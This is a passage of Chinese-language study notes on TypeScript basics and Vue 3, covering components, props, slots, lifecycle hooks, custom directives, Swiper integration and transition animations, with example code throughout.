    - 枚举成员会被赋值从0开始递增的数字，同时也会被枚举值到枚举名进行反向映射

      ```typescript
      // 枚举类型会被编译成一个双向映射的对象
      enum Days {
          // 这里默认是0，设置成其他值时会基于该值进行累加
          Sun = 0,
          Mon,
          Tue,
          Wed,
          Thu,
          Fri,
          Sat
      }
      console.log(Days.Fri); // 5
      console.log(Days[0]); // Sun
      ```

15. 类的修饰符，这跟java一样啊马飞

    - public：修饰的属性或者方法是共有的，可以在任何地方被访问到，默认所有的属性或者方法都是public的

    - private：修饰的属性或者方法是私有的，不能在声明它的类外面访问（即使是子类）

    - protected：修饰的属性或者方法是受保护的，只能在类和子类中访问

    - static：修饰的属性或者方法为类的静态属性或者静态方法，可以通过 `类.方法/属性` 的方式直接进行访问，也可以由子类继承

      ```typescript
      class Person {
          private name = "张三"
          age = 18
          protected say() {
              console.log("我的名字是" + this.name + ", " + this.age);
          }
          static test() {
              console.log("test");
          }
      }
      var p = new Person()
      // p.say()
      // console.log(p.name);
      class Child extends Person {
          callParent() {
              super.say()
          }
      }
      var c = new Child()
      c.callParent()
      console.log(c.age);
      
      Child.test()
      ```

16. 泛型

    - 在定义函数、接口或类的时候，不预先指定具体类型，而在使用的时候再指定类型的一种特性

      ```typescript
      function createArray<T>(length: number, value: T): Array<T> {
          let arr = []
          for (let index = 0; index < length; index++) {
              arr[index] = value
          }
          return arr
      }
      
      var strArr: string[] = createArray<string>(3, '1')
      console.log(strArr);
      
      // 接口中使用泛型
      interface Icreate {
          <T>(name: string, value: T): Array<T>
      }
      let func: Icreate;
      func = function <T>(name: string, value: T): Array<T> {
          return []
      }
      var strArr: string[] = func("zhangsan", "12")
      ```


## 16. <a id="vue3">Vue3补充</a>

> 第二个视频课程的笔记，仅记录补充内容

### 1-前言

1. vue3的js导入形式

   ```html
   <body>
       <div id="app">
           {{10+20}}
       </div>
       <div id="box">
           {{20+20}}
       </div>
   
       <script>
           Vue.createApp().mount("#app")
           Vue.createApp().mount("#box")
       </script>
   </body>
   </html>
   ```

2. vscode使用volar，禁用vetur

3. 三目运算符：`表达式?true的话怎么办:false的话怎么办`

### 2-模板语法

1. 类似 `disabled` 的属性，可以通过 `:disabled="temp"`，给 `temp` 赋值 true 或 false 来控制禁用的真和假

2. `v-show` 和 `v-if` 的区别：一个是显示和隐藏，一个是创建和删除

3. 案例1：列表的增加和删除

   ```html
   <!DOCTYPE html>
   <html lang="en">
       <head>
           <meta charset="UTF-8" />
           <meta name="viewport" content="width=device-width, initial-scale=1.0" />
           <title>Document</title>
           <script src="vue.js"></script>
       </head>
       <body>
           <div id="box">
               <input v-model="temp" type="text" />
               <button @click="add">add</button>
               <ul>
                   <li v-for="(item, index) in list" :key="item">
                       {{ item }}
                       <button @click="del(index)">delete</button>
                   </li>
               </ul>
   
               <div v-show="list.length === 0">暂无代办事项</div>
           </div>
           <script>
               obj = {
                   data() {
                       return {
                           temp: "",
                           list: [111, 222, 333],
                       };
                   },
                   methods: {
                       add() {
                           this.list.push(this.temp);
                           this.temp = "";
                       },
                       del(index) {
                           this.list.splice(index, 1);
                       },
                   },
               };
               var app = Vue.createApp(obj).mount("#box");
           </script>
       </body>
   </html>
   ```

4. 案例2：点击列表更换背景色

   ```html
   <!DOCTYPE html>
   <html lang="en">
       <head>
           <meta charset="UTF-8" />
           <meta name="viewport" content="width=device-width, initial-scale=1.0" />
           <title>Document</title>
           <script src="vue.js"></script>
   
           <style>
               .activate {
                   background: red;
               }
           </style>
       <body>
           <div id="box">
               <ul>
                   <li v-for="(item, index) in items" :key="item" :class="aim_index===index?'activate':''" @click="aim_index=index">
                       {{ item }}
                   </li>
               </ul>
   
               <div v-html="htmlTest"></div>
           </div>
   
           <script>
               obj = {
                   data(){
                       return {
                           items: [1, 2, 3],
                           aim_index: 0,
                           htmlTest: "<b>asd</b>"
                       }
                   },
               }
               var app = Vue.createApp(obj).mount("#box");
           </script>
       </body>
   </html>
   ```

5. `:class`

   1. 对象写法：`<div :class="{aaa:true, bbb:false, ccc:true}">temp</div>` = `class=aaa ccc`
   2. 数组写法：`<div :class=["aaa", "ccc"]>temp</div>` = `class=aaa ccc`

6. `:style`

   1. 对象写法

      1. 复合属性需要改为驼峰：`background-color` -> `backgroundColor`

      2. 或者把属性名改成字符串：`background-color` -> `“background-color”`

         ```html
         <div :style="{
             fontSize: '30px',
             'background-color': 'yellow'
         }">asd</div>
         ```

   2. 数组写法：

      1. `<div :style=[styleObj1, styleObj2]></div>`
      2. 数组中的每一个元素依然还是上述的对象写法
      3. 如果push之后，跟之前的元素有属性上的重合，则会出现覆盖的情况

   3. 案例1：添加style属性

      ```
      // html
      <div :style="imgObj"></div>
      <button @click="handleAjax">click</button>
      
      // data
      imgObj: {
          width: "200px",
          height: "200px",
          backgroundSize: "cover",
      }
      
      // methods
      handleAjax(){
          this.imgObj.backgroundImage = "url(https://static.maizuo.com/pc/v5/usr/movie/51ec9e9866ed2d2a0f905e4c100f9e27.jpg?x-oss-process=image/quality,Q_70)"
      }
      ```

7. 案例3：模糊搜索

   - 方法1：使用template包装+includes检测字符串中是否包含输入的字符串

     ```html
     <ul>
         <template v-for="item in mylist" :key="item">
             <li v-if="item.includes(mytext)">{{ item }}</li>
         </template>
     </ul>
     ```

   - 方法2：使用 `@input` 事件控制，和复制的列表进行过滤和展示

     ```js
     this.computedMylist = this.mylist.filter((i) =>
         i.includes(this.mytext)
     );
     ```

   - 方法3：使用函数获取最新的展示列表

     ```html
     <li v-for="item in getNewList()" :key="item.id">{{ item }}</li>
     ```

     - 缺点，如果有多个该函数的调用，那么每次更新展示列表，就会计算多次该函数

   - 方法4：computed，直接把上面的函数移到computed中，然后把使用到的地方的括号去掉

     ```html
     <li v-for="item in getNewList" :key="item.id">{{ item }}</li>
     ```

8. computed注意事项

   1. Getter不应有副作用：计算属性的getter应只做计算而没有任何其他的副作用，这一点非常重要。 **不要在getter中做异步请求或者更改DOM**
   2. 避免直接修改计算属性值

9. 数据请求

   - fetch

     - 兼容性不好

     - 获取json内容

       ```js
       fetch("./test.json")
           .then(res => { return res.json() })
           .then(res => {
               console.log(res);
           })
       ```

     - 不确定内容是不是json的话，获取文本内容

       ```js
       fetch("./test.json")
           .then(res => { return res.text() })
           .then(res => {
               console.log(res);
           })
       ```

     - post：在fetch的第二个参数中添加

       ```js
       fetch("./test.json", {
       	method: "post",
       	headers: {
       		"content-type": "application/x-www-form-urlencoded",
       	},
       	body: "name-=xiaoming&age=19"
       })
           .then(res => { return res.json() })
           .then(res => {
               console.log(res);
           })
       ```

   - axios

     - Axios是一个基于promise的HTTP库，可以用在浏览器和node.js中

     - get

       ```js
       axios.get(...).then(res=>{...}).catch(err=>{...})
       ```

     - post

       - 默认是json

         ```js
         axios.get(..., {name: ..., age:...}).then(res=>{...}).catch(err=>{...})
         ```

       - form（application/x-www-form-urlencoded）

         ```js
         axios.get(..., "name=...&age=...").then(res=>{...}).catch(err=>{...})
         ```

     - 完整版用法

       ```js
       axios({
       	method: "post",
       	url: "",
       	data: {}
       }).then(res=>{}).catch(err=>{})
       ```

10. 过滤器

    1. vue3中不支持过滤器了，建议使用method或者computed来替换

    2. vue2过滤器

       ```
       <p>{{ accountBalance | currencyUSD }}</p>
       
       filters: {
       	currencyUSD(value){
       		return '$' + value
       	}
       }
       ```

### 3-组件

> 组件允许我们将UI划分为独立的、可重用的部分，并且可以对每个部分进行单独的思考。在实际应用中，组件常常被组织成层层嵌套的树状解构

1. 全局组件和局部组件

   ```js
   var obj = {
       data() {
           return {}
       }
   }
   const app = Vue.createApp(obj)
   // 组件
   app.component("kerwin-navbar", {
       // 模板
       template: `
               <nav style="background:yellow;">
                   <div>
                       <ul>
                           <li>首页</li>
                           <li>新闻中心</li>
                           <li>产品</li>
                       </ul>    
                   </div>
               </nav>
               `
   })
   app.component("kerwin-sidebar", {
       template: `
                   <aside>
                       我是侧边栏
                       <kerwin-button></kerwin-button>  
                   </aside>
               `,
       // 局部组件定义
       components: {
           "kerwin-button": {
               template: `<div style="background:red">
                               <button>联系</button>
                           </div>`
           }
       }
   })
   app.mount("#box")
   ```

2. 单文件组件

   - 全局注册组件：在main.js中注册组件

   - 局部注册组件：在vue中的script中引入，在components中注册

     ```
     components: {
     	navbar,
     },
     ```

   - import的内容需要写成驼峰的写法，在template中改成 `-` 连接，不过，如果在template中直接使用驼峰写法，也是可以的

   - `scoped`：限制css样式只能影响当前页面的样式

   - 反向代理：在 `vue.config.js` 中配置，配置完后需要重启服务器

     ```js
     devServer: {
     	proxy: {
             // 将接口开头为 /t 的代理到 下面的网站去
     		'/t': {
     			target: 'https://i.maoyan.com',
     			changeOrigin: true
     		}
     	}
     }
     ```

3. Vite

   1. vue-cli基于webpack，源代码串联实现代码打包，第一次启动很慢

   2. vite默认认为现代浏览器，如果是传统的浏览器可以使用插件 `@vite.js/plugin-legacy` 来支持

   3. 安装和启动：`npm create vite@latest` ，可以直接使用该命令跳过安装的步骤并开始创建项目，如果不存在的vite，会提示安装

   4. 在浏览器中可以直接使用 es6 模块化

      ```html
      <script type="module">
      	import obj from './test.js'
      	console.log(obj)
      </script>
      ```

4. 父传子

   1. 传递属性的时候，如果标签中的属性是 `-` 连接的，那么接受的时候，props中要写成驼峰的写法

   2. 父类写法：

      1. 通过属性传递：`<Navbar title="首页" left="返回" right="首页"></Navbar>`

      2. 通过v-bind传递：

         ```html
         <Navbar v-bind="{
                     title: 'aaa',
                     'left': 'l',
                     'right': 'r'
                 }"></Navbar>
         ```

      3. 通过 `:` 动态绑定属性

   3. props 遵行单向绑定的原则，不能在子组件中修改父组件的属性

   4. 没有加 `:` 的都是静态绑定，传入的都是字符串

   5. props进行属性校验

      - 类型、是否必填、检验、默认值

        ```js
        props: {
                title: String,
                left: [String, Number],
                right: {
                    // 要求是否必填
                    required: true,
                    type: String,
                    validator(value){
                        return ['success', 'warning', 'danger'].includes(value)
                    }
                },
                leftshow: Boolean,
                rightshow: {
                    type: Boolean,
                    // 默认值
                    default: true
                }
            }
        ```

   6. 属性透传：

      - 主要是class、style、id
      
      - 同名属性会进行合并：`class="A B"`
      - 如果子组件中调用了子组件，则会继续透传到子组件
      - 绑定的事件也会透传到子组件上，并且多个节点都会触发事件
      - 禁止透传：`inheritAttrs: false`
        - 可以设置子组件某节点 `v-bind:"$attrs"`，将父组件的绑定事件透传给该节点
        - 如果没有在子组件中进行设置，那么事件就会与根节点绑定
      - 子传父的歪门邪道：
        - 父中定义属性a，b
        - 子A中接受属性a；子B中接受属性b，且button接受透传和设置禁止透传
        - 父中定义B组件事件@b，修改b的状态，定义A组件 `:a="b"`
        - 从而实现了点击button，完成A组件属性的传递

5. 子传父

   1. 父中定义事件-A>函数a，子中定义点击事件B->b
   1. b触发事件A：`this.$emit("A", param1, param2)`
   1. a中接受子的参数，实现子传父

6. `$refs`

   ——父组件的强权

   - ref 如果绑定在dom节点上，拿到的就是原生 dom 节点

     ```
     <input ref="myinput">
     
     console.log(this.$refs.myinput);
     ```

   - ref 如果绑定在组件上，拿到的就是组件对象，可以实现通信功能

     ```
     <Child ref="myChild"></Child>
     
     console.log(this.$refs.myChild);
     this.$refs.myChild.childtitle = "junjun"
     ```

7. `$parent`、`$root`

   ——子组件的无法无天

   - `this.$parent.$parent.属性`：拿到父/爷 辈的值

8. 跨级通信：

   - provide与inject

   - provide与inject不是响应的，是断联的
   - 如果传入的不是属性/状态，而是支持响应的对象（比如直接把this传给provide），则是响应的：`this.app.navTitle = this.item`
   - 使用方法比较危险，耦合较高

9. 订阅发布

   ——非父子通信 （vuex的基本原理）

   - 订阅者把对象存储到数组中

   - 发布者遍历数组，拿出来调用

     ![在这里插入图片描述](https://img-blog.csdnimg.cn/2c3396c38f514630b70b6b9f46ec023f.png)

     ```js
     datalist: [],
     subscribe(cb){
         this.datalist.push(cb)
     },
     publish(x){
         this.datalist.forEach(cb => cb(x))
     }
     ```

10. 动态组件

    ——墙头草

    - `<component :is="组件名"></component>`

    - 动态组件在切换的时候，可能已经输入了部分数据，切换时会导致输入的数据丢失，因此需要保持组件状态存活，所以需要外面套一个 `keep-alive` 或者 `KeepAlive`

      ```html
      <keep-alive>
      	<component :is="which"></component>
      </keep-alive>
      ```

    - 通过指定 include 等于对应的组件名，使得keep-alive缓存对应的组件；此外，需要在组件中指定组件的名称：name，这个名称也可以用正则表达式、数组

      ```
      <keep-alive include="home,list">
      	<component :is="which"></component>
      </keep-alive>
      
      <script>
          export default {
              name: "home"
          }
      </script>
      ```

      正则表达式：`<keep-alive include="/home|list/">`

      数组：`<keep-alive include="['home', 'list']">`

    - 通过 `exclude` 不包含组件

11. 组件中的v-model

    - vmodel实现底层逻辑：

      ```html
      <input type="text" v-model="myvalue">
      <!-- 等价于 -->
      <input type="text" :value="myvalue" @input="myvalue=$event.target.value">
      ```

    - 组件绑定input的底层逻辑：

      1. 父：通过 `:属性` 绑定一个变量传属性给子，定义 `@事件(value)` 把属性绑定的变量赋值value
      2. 子：`props` 中接受父的属性，并绑定给input的属性 `:子属性=父属性` ；定义 `@input` 触发父类事件，传值 `evt.target.value`
      3. 从而实现了组件input的双向绑定

    - 组件绑定input的 vmodel 实现：

      1. 父：直接 vmodel 绑定状态
      2. 子：`props` 中接受 `modelValue` 固定的属性名，然后在input中绑定 `:属性=modelValue`；定义 `@input` 触发固定事件名：`this.$emit("update:modelValue", evt.target.value)`

    - 修改上述子绑定中固定的modelValue写法

      1. 父：`v-model:kerwin="属性"`
      2. 子：接受的属性为 kerwin，input中绑定的同理，事件名改为：`update:kerwin`

12. 异步组件

    - 在大型项目中，我们可能需要拆分应用为更小的块，并仅在需要时再从服务器加载相关组件。Vue 提供了 `defineAsynccomponent` 方法来实现此功能

      ```js
      components: {
              Navbar,
              Tabbar,
              Home: defineAsyncComponent(() => import('./views/Home.vue')),
              List: defineAsyncComponent(() => import('./views/List.vue')),
              Center: defineAsyncComponent({
                  // 加载函数
                  loader: () => import('./views/Center.vue'),
                  // 加载异步组件时使用的组件
                  loadingComponent: LoadingComponent,
                  // 展示加载组件前的延迟时间，默认为200ms
                  delay:200,
                  // 加载失败后展示的组件
                  errorComponent: ErrorComponent,
                  // 如果提供了一个timeout时间限制，并超时了
                  // 也会显示这里配置的报错组件，默认是：Infinity
                  timeout: 2000
              }),
          }
      ```

13. 组件插槽

    1. 插槽的基本应用
       - 插槽内容可以访问到父组件的数据作用域，因为插槽内容本身是在父组件模板中定义的
       - 插槽内容 **无法访问** 子组件的数据，Vue模板中的表达式只能访问其定义时所处的作用域，这和JavaScipt的词法作用域规则是一致的。即：**父组件模板中的表达式只能访问父组件的作用域；子组件模板中的表达式只能访问子组件的作用域**

    2. 具名插槽

       - 为了解决不同的内容，插入到不同插槽

       - **不需要子传父，就可以实现事件和父状态的绑定**

       - 子：给slot组件新增属性name

         ```html
         <slot name="one"></slot>
         child
         <slot name="two"></slot>
         <slot></slot>
         ```

       - 父：使用 template 包装，并指定 `v-slot:name`，简写：`#name`

         ```html
         <Child>
             <template v-slot:one>
                 <div>我是app组件重的div</div>
             </template>
             <template #two>
                 <div>我是插槽2</div>
             </template>
         
             <div>3333</div>
         </Child>
         ```

    3. <a id="slot"> </a>作用域插槽

       - 子组件中通过在slot中赋值：`<slot :mylist="datalist" a=1 b=2>`

       - 父组件在组件的tag中接受和使用：

         ```html
         <Nowplaying v-slot="myprops">
             <ul>
                 <li v-for="item in myprops.mylist" :key="item.filmId">
                     <img :src="item.poster" alt="" style="width: 100px" />
                     {{ item.name }}
                 </li>
             </ul>
         </Nowplaying>
         ```

       - 作用：在极少改变父组件中组件tag的情况下，就能编辑子组件的表现样式，增加复用性（通过 将子的属性值传给父+插槽替换子slot里的内容 实现）

       - 如果是具名插槽的话：`<Nowplaying v-slot:movie="myprops">`，简写：`<Nowplaying #movie="myprops">`

14. 生命周期

    1. 创建阶段

       1. created能访问到data中的数据，beforeCreate访问不到
       2. mounted可以拿到dom，beforeMount拿不到
          - mounted中可以：订阅发布、ajax、setInterval、访问dom节点、原生js

    2. 更新阶段

       - updated可以拿到更新后的dom，beforeUpdate拿不到

          - 可以在updated中拿到组件的配置并更新，比如`this.myChart.resize()`

          - 缺点：任何状态更新都会走updated

          - 改进：使用nextTick，一次性的监听器，紧邻着更新调用（调用的时间最晚）

            ```js
            handleClick(){
            	this.mywidth = '800px'
            	this.$nextTick(()=>{this.myChart.resize()})
            }
            ```

    3. 销毁阶段

       - unmounted已经销毁了，beforeUnmount还没
       - 组件卸载的情况：v-if为假、路由切换
       - 作用：对类似window等事件进行解绑：`window.onresize=null`

15. 组件的封装

    1. swiper的基本使用：https://swiper.com.cn/usage/index.html

       - 需要在所有的dom初始化之后，才能基于js初始化swiper和对应的事件

    2. swiper在vue的使用：

       1. mouted获取数据
       2. updated更新初始化

       ```vue
       <template>
           <div>
               <div class="swiper">
                   <div class="swiper-wrapper">
                       <div class="swiper-slide" v-for="data in datalist" :key="data">
                           {{ data }}
                       </div>
                   </div>
                   <div class="swiper-pagination"></div>
               </div>
           </div>
       </template>
       
       <script>
       import Swiper from "swiper";
       import "swiper/css";
       import "swiper/css/pagination";
       import { Pagination } from "swiper/modules";
       
       export default {
           data() {
               return {
                   datalist: [],
               };
           },
           mounted() {
               setTimeout(() => {
                   this.datalist = ["aa", "bb", "cc"];
               }, 2000);
           },
           updated() {
               var mySwiper = new Swiper(".swiper", {
                   modules: [Pagination],
                   // 循环模式选项
                   loop: true,
       
                   // 如果需要分页器
                   pagination: {
                       el: ".swiper-pagination",
                   },
                   on: {
                       slideChange() {
                           console.log("便咯" + this.activeIndex);
                       },
                   },
               });
           },
       };
       </script>
       
       <style scoped>
       .swiper {
           width: 600px;
           height: 300px;
       }
       </style>
       ```

       优化：将update的内容放入 `$nextTick` 中

       ```vue
       <template>
           <div>
               <div class="swiper">
                   <div class="swiper-wrapper">
                       <div class="swiper-slide" v-for="data in datalist" :key="data">
                           {{ data }}
                       </div>
                   </div>
                   <div class="swiper-pagination"></div>
               </div>
           </div>
       </template>
       
       <script>
       import Swiper from "swiper";
       import "swiper/css";
       import "swiper/css/pagination";
       import { Pagination } from "swiper/modules";
       
       export default {
           data() {
               return {
                   datalist: [],
               };
           },
           mounted() {
               setTimeout(() => {
                   this.datalist = ["aa", "bb", "cc"];
                   this.$nextTick(() => {
                       var mySwiper = new Swiper(".swiper", {
                           modules: [Pagination],
                           // 循环模式选项
                           loop: true,
       
                           // 如果需要分页器
                           pagination: {
                               el: ".swiper-pagination",
                           },
                           on: {
                               slideChange() {
                                   console.log("便咯" + this.activeIndex);
                               },
                           },
                       }); 
                   });
               }, 2000);
           },
           updated() {},
       };
       </script>
       
       <style scoped>
       .swiper {
           width: 600px;
           height: 300px;
       }
       </style>
       ```

    3. swiper组件封装

       1. 使用observer解决异步更新的问题：如果设置 `observer:true` ，那么 `loop:true` 将不好用

       2. swiper的初始化放在组件的updated中

       3. 实战

          - 组件：MySwiper

            ```vue
            <template>
                <div>
                    <div class="swiper">
                        <div class="swiper-wrapper">
                            <slot></slot>
                        </div>
                        <div class="swiper-pagination"></div>
                    </div>
                </div>
            </template>
            
            <script>
            import Swiper from "swiper";
            import "swiper/css";
            import "swiper/css/pagination";
            import { Pagination } from "swiper/modules";
            
            export default {
                props:{
                    loop: {
                        type: Boolean,
                        default: true
                    },
                    slidesPerView: {
                        type: Number,
                        default: 1
                    },
                    spaceBetween: {
                        type: Number,
                        default: 0
                    }
                },
                mounted() {
                    var mySwiper = new Swiper(".swiper", {
                        modules: [Pagination],
                        // 循环模式选项
                        loop: this.loop,
                        slidesPerView: this.slidesPerView,
                        spaceBetween: this.spaceBetween,
            
                        // 如果需要分页器
                        pagination: {
                            el: ".swiper-pagination",
                        },
                        on: {
                            slideChange:() => {
                                console.log("便咯" + mySwiper.activeIndex);
                                this.$emit("kerwinSlideChange", mySwiper.activeIndex)
                            },
                        },
                    });
                },
            };
            </script>
            
            <style scoped>
            .swiper {
                width: 600px;
                height: 300px;
            }
            </style>
            ```

          - 插槽里放子组件 MySwiperItem

            ```vue
            <template>
                <div class="swiper-slide">
                    <slot></slot>
                </div>
            </template>
            
            <script>
            export default {};
            </script>
            
            <style scoped></style>
            ```

          - 使用 App

            ```vue
            <template>
                <div>
                    <MySwiper v-if="items.length" :slidesPerView="3" :loop="false" @kerwinSlideChange="handleChange">
                        <MySwiperItem v-for="item in items" :key="item">
                            {{ item }}
                        </MySwiperItem>
                    </MySwiper>
                </div>
            </template>
            
            <script>
            import MySwiper from "./MySwiper.vue";
            import MySwiperItem from "./MySwiperItem.vue";
            export default {
                components: {
                    MySwiper,
                    MySwiperItem,
                },
                data() {
                    return {
                        items: [],
                    };
                },
                mounted() {
                    setTimeout(() => {
                        this.items = ["aaa", "bbb", "ccc", "ddd", "eee"];
                    }, 2000);
                },
                methods: {
                    handleChange(index){
                        console.log("asdf-", index);
                    }
                }
            };
            </script>
            
            <style scoped></style>
            ```

### 4-指令

1. 指令写法与钩子

   除了Vue内置的一系列指令（v-model 或者 v-show）之外，Vue还允许你注册自定义的指令（Custom Directives）。自定义指令主要是为了重用涉及普通元素的底层DOM访问逻辑。

   - 全局指令：

     ```js
     const app = createApp({})
     
     // 使用v-foces，所有组件可用
     app.directive('focus', {
     	...
     })
     ```

   - 局部指令：

     ```js
     const focus = {
     	mounted: (el) => el.focus()
     }
     
     export default{
     	directives: {
     		// 在模板中启用 v-focus
     		focus
     	}
     }
     ```

   - 指令后面接等号，传入的直接是js的地盘，字符串要写 `v-kerwin="'aa'"`。通过第二个参数 `binding` 来进行参数传递，可以直接传递data中的状态

     ```js
     directives: {
         aa: {
             mounted(el, binding) {
                 console.log("当前节点插入到父节点的时候调用", el);
                 el.style.background = binding.value;
             },
         },
     }
     ```

   - 指令的生命周期：（加粗为最常用）

     - created(el, binding, vnode, prevVnode)
     - beforeMount
     - **mounted**
     - beforeUpdate
     - **updated**
     - beforeUnmount
     - unmounted

   - 指令简写，mounted和updated都执行同样的内容

     ```js
     cc(el, binding){
     	el.style.background = binding.value
     }
     ```

2. 指令的应用

   - 过去异步获取数据后，通过紧接着使用 `$nextTick` 初始化解决

   - 指令跟组件是脱钩的，this拿不到data的状态

   - 通过指令检测目标dom，如果能拿到，说明节点插入到了dom中。简单来说，指令的mounted执行的时候一定是 节点创建并插入到了dom中了。

   - 上述情况会造成，循环的时候，每次都会执行一遍，所以需要找到最后一个节点。**通过把 v-for 中的index 作为参数传给 指令**，除了参数，还可以传对象，把index和length传入即可

     ```html
     <div class="swiper-wrapper">
         <div
             v-lt="{index, length:datalist.length}"
             class="swiper-slide"
             v-for="(data, index) in datalist"
             :key="data"
         >
             {{ data }}
         </div>
     </div>
     ```

   - 通过index和length-1比较获得最后一个节点挂载完毕后，初始化swiper

     ```vue
     <template>
         <div>
             <div class="swiper">
                 <div class="swiper-wrapper">
                     <div
                         v-lt="{ index, length: datalist.length }"
                         class="swiper-slide"
                         v-for="(data, index) in datalist"
                         :key="data"
                     >
                         {{ data }}
                     </div>
                 </div>
                 <div class="swiper-pagination"></div>
             </div>
         </div>
     </template>
     
     <script>
     import Swiper from "swiper";
     import "swiper/css";
     import "swiper/css/pagination";
     import { Pagination } from "swiper/modules";
     
     export default {
         data() {
             return {
                 datalist: [],
             };
         },
         mounted() {
             setTimeout(() => {
                 this.datalist = ["aa", "bb", "cc"];
             }, 2000);
         },
         directives: {
             lt: {
                 mounted(el, binding) {
                     console.log("插进来啦");
                     let { index, length } = binding.value;
                     if (index === length - 1) {
                         console.log("最后一个节点");
                         var mySwiper = new Swiper(".swiper", {
                             modules: [Pagination],
                             // 循环模式选项
                             loop: true,
     
                             // 如果需要分页器
                             pagination: {
                                 el: ".swiper-pagination",
                             },
                             on: {
                                 slideChange() {
                                     console.log("便咯" + this.activeIndex);
                                 },
                             },
                         });
                     }
                 },
             },
         },
     };
     </script>
     
     <style scoped>
     .swiper {
         width: 600px;
         height: 300px;
     }
     </style>
     ```

### 5-过渡效果

Vue提供了两个内置组件，可以帮助你制作基于状态变化的过渡和动画：

- `Transition`：会在一个元素或者组件进入和离开dom时应用动画
- `TransitionGroup`：会在一个 `v-for` 列表中的元素或组件被插入、移动或者移除的时候应用动画

1. 过渡效果

   - 默认添加Transition

     ```vue
     <template>
         <div>
             <button @click="isShow = !isShow">click</button>
             <Transition>
                 <div v-show="isShow">111</div>
             </Transition>
         </div>
     </template>
     
     <script>
     export default {
         data() {
             return {
                 isShow: true,
             };
         },
     };
     </script>
     
     <style scoped>
     .v-enter-active, .v-leave-active {
         /* transition: opacity 0.5s ease; */
         transition: all 0.5s ease;
     }
     .v-enter-from, .v-leave-to {
         opacity: 0;
         transform: translateX(100px);
     }
     html, body {
         overflow-x: hidden;
     }
     </style>
     ```

   - 通过指定 name 给固定的Transition添加效果

     ```vue
     <Transition name="kerwin">
     	<div v-show="isShow">111</div>
     </Transition>
     
     <style scoped>
     .kerwin-enter-active, .kerwin-leave-active {
         /* transition: opacity 0.5s ease; */
         transition: all 0.5s ease;
     }
     .kerwin-enter-from, .kerwin-leave-to {
         opacity: 0;
         transform: translateX(100px);
     }
     </style>
     ```

   - Transition中JS的钩子

     ```js
     <Transition
     @before-enter="onBeforeEnter"
     @enter = "onEnter"
     @after-enter = "onAfterEnter"
     @enter-cancelled = "onEnterCancelled"
     @before-leave = "onBeforeLeave"
     @leave = "onLeave"
     @after-leave = "onAfterLeave"
     @leave-cancelled = "onLeaveCancelled"
     >
     </Transition>
     ```

   - appear：第一次刷新的时候显示效果，`<Transition name="kerwin" appear></Transition>`

   - 动画的交互：`v-if` 和 `v-else`

     ```HTML
     <Transition
         enter-active-class="animate__bounceIn"
         leave-active-class="animate__bounceOut"
     >
         <div v-if="isShow">333</div>
         <div v-else="isShow">444</div>
     </Transition>
     ```

     - 老版本vue2中不支持这样的方式，需要增加key的属性，来保证vue不进行性能的优化（只修改dom的value），从而实现动画的替换

   - 设置动画的顺序：`mode`

     - `in-out`：先进再出，不咋地啊这个
     - `out-in`：先出再进，完美

   - 组件同样的可以直接包裹 Transition 实现动画效果

2. 列表过渡

   - Transition 中只能包含单条或者逻辑为单个的 dom 或者 组件

   - 如果需要包含复杂的内容，则需要用到TransitionGroup

   - 使用TransitionGroup中的 `tag="ul"`，替换对应的 ul

   - 整体的动画代码，末尾新增了两个样式来实现列表删除后，更新的时候也有动画

     ```vue
     <template>
         <div>
             <Navbar></Navbar>
     
             <!-- <Home v-if="which==='首页'"></Home>
             <List v-else-if="which==='列表'"></List>
             <Center v-else></Center> -->
     
             <!-- 内置的动态组件 -->
             <keep-alive>
                 <Transition name="jun" mode="out-in">
                     <component :is="which"></component>
                 </Transition>
             </keep-alive>
     
             <Tabbar></Tabbar>
     
             <input type="text" v-model="mytext" />
             <button @click="handleAdd">add</button>
             <!-- <ul> -->
             <TransitionGroup tag="ul" name="jun">
                 <li v-for="(item, index) in items" :key="item">
                     {{ item }}
                     <button @click="handleDel(index)">del</button>
                 </li>
             </TransitionGroup>
             <!-- </ul> -->
         </div>
     </template>
     
     <script>
     import Navbar from "./Navbar.vue";
     import Tabbar from "./Tabbar.vue";
     import store from "./store";
     import Center from "./views/Center.vue";
     import Home from "./views/Home.vue";
     import List from "./views/List.vue";
     export default {
         data() {
             return {
                 navTitle: "我的首页",
                 which: "Home",
                 mytext: "",
                 items: [],
             };
         },
         methods: {
             handleAdd() {
                 this.items.push(this.mytext);
                 this.mytext = "";
             },
             handleDel(index) {
                 this.items.splice(index, 1);
             },
         },
         provide() {
             return {
                 navTitle: this.navTitle,
                 app: this,
             };
         },
         mounted() {
             var obj = {
                 首页: "Home",
                 列表: "List",
                 我的: "Center",
             };
             store.subscribe((value) => {
                 // 列表 list
                 // 首页 Home
                 // 我的 Center
                 this.which = obj[value];
             });
         },
         components: {
             Navbar,
             Tabbar,
             Home,
             List,
             Center,
         },
     };
     </script>
     
     <style>
     * {
         margin: 0;
         padding: 0;
     }
     
     ul {
         list-style: none;
     }
     
     .kerwin-enter-active,
     .kerwin-leave-active {
         /* transition: opacity 0.5s ease; */
         transition: all 0.5s ease;
     }
     .kerwin-enter-from,
     .kerwin-leave-to {
         opacity: 0;
         transform: translateX(100px);
     }
     .jun-enter-active {
         animation: junanimate 1s;
     }
     .jun-leave-active {
         animation: junanimate 1s reverse;
     }
     
     @keyframes junanimate {
         0% {
             transform: translateX(100px);
             opacity: 0;
         }
         100% {
             transform: translateX(0);
             opacity: 1;
         }
     }
     
     html,
     body {
         overflow-x: hidden;
     }
     /* 列表上来的速度 */
     .jun-move {
         transition: all 0.5s ease;
     }
     /* 确保将离开的元素从布局流中删除，以便能够正确的计算移动的动画 */
     .jun-leave-active {
         position: absolute;
     }
     </style>
     ```

3. 可复用过渡

   - 动画的写法

     - 入场动画：name是自定义的变换名称，对应Transition中的name的值，animate_name是动画的名称，持续时间为1s；然后通过定义 `@keyframes` 来描述动画样式、关键帧等内容

       ```css
       .name-enter-active {
       	animation: animate_name 1s
       }
       
       @keyframes animate_name {
           0%{
               transform: translateX(-100px);
               opacity: 0;
           }
           100%{
               transform: translateX(0);
               opacity: 1;
           }
       }
       ```

     - 出场动画：`name-leave-active`，与上述入场类似

   - 动画的封装

     ```vue
     <template>
         <div>
             <Transition :name="myname">
                 <slot></slot>
             </Transition>
         </div>
     </template>
     
     <script>
         export default {
             props: ["myname"]
         }
     </script>
     
     <style scoped>
     .l2r-enter-active{
         animation: kerwinanimate 1s;
     }
     .l2r-leave-active{
         animation: kerwinanimate 1s reverse;
     }
     
     .r2l-enter-active{
         animation: kerwinanimate2 1s;
     }
     .r2l-leave-active{
         animation: kerwinanimate2 1s reverse;
     }
     
     @keyframes kerwinanimate {
         0%{
             transform: translateX(-100px);
             opacity: 0;
